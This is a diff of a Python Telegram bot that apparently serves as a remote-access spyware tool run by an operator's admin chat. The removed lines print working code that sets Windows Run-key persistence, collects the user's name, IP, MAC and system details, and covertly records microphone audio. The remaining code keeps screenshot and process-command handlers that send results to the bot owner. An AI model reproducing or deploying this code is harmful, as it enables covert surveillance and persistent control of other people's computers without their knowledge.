@@ -1,49 +1,15 @@
 import asyncio
 from aiogram import Bot, Dispatcher, types, executor
-import getpass
 import os
-import platform
-import socket
-import sys
-from datetime import datetime, timezone
 from config import BOT_TOKEN, admin_chat_id
-from uuid import getnode as get_mac
-import psutil
 import pyautogui
-from speedtest import Speedtest
-import pyaudio
-import wave
 from PIL import Image
 from subprocess import Popen, PIPE
-from winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
+
+# todo in the end update requirements
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(bot)
-
-autoname = "FILENAME.py"
-path = os.path.dirname(os.path.realpath(__file__))
-address = os.path.join(path, autoname)
-key_reg = OpenKey(HKEY_CURRENT_USER,
-                  r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
-                  0, KEY_ALL_ACCESS)
-SetValueEx(key_reg, autoname, 0, REG_SZ, address)
-CloseKey(key_reg)
-#
-start = datetime.now()
-name = getpass.getuser()
-ip = socket.gethostbyname(socket.gethostname())
-mac = get_mac()
-ost = platform.uname()
-inet = Speedtest()
-download = float(str(inet.download())[0:2] + "."
-                 + str(round(inet.download(), 2))[1]) * 0.125
-uploads = float(str(inet.upload())[0:2] + "."
-                + str(round(inet.download(), 2))[1]) * 0.125
-zone = psutil.boot_time()
-time = datetime.fromtimestamp(zone)
-cpu = psutil.cpu_freq()
-ends = datetime.now()
-workspeed = format(ends - start)
 
 
 async def main():
@@ -83,40 +49,7 @@ async def cmd_screen(message: types.Message):
 
 
 async def cmd_audio(message: types.Message):
-    chunk = 1024
-    formats = pyaudio.paInt16
-    channels = 2
-    rate = 44100
-    second = 5     # SECONDS
-    names = "sound.wav"
-    p = pyaudio.PyAudio()
-    stream = p.open(format=formats,
-                    channels=channels,
-                    rate=rate,
-                    input=True,
-                    frames_per_buffer=chunk)
-    print("")
-
-    frames = []
-
-    for i in range(0, int(rate / chunk * second)):
-        data = stream.read(chunk)
-        frames.append(data)
-
-    print("")
-
-    stream.stop_stream()
-    stream.close()
-    p.terminate()
-
-    wf = wave.open(names, "wb")
-    wf.setnchannels(channels)
-    wf.setsampwidth(p.get_sample_size(formats))
-    wf.setframerate(rate)
-    wf.writeframes(b''.join(frames))
     await message.answer_audio(open("sound.wav", "rb"))
-    wf.close()
-    os.remove(names)
 
 
 async def cmd_process(message: types.Message):
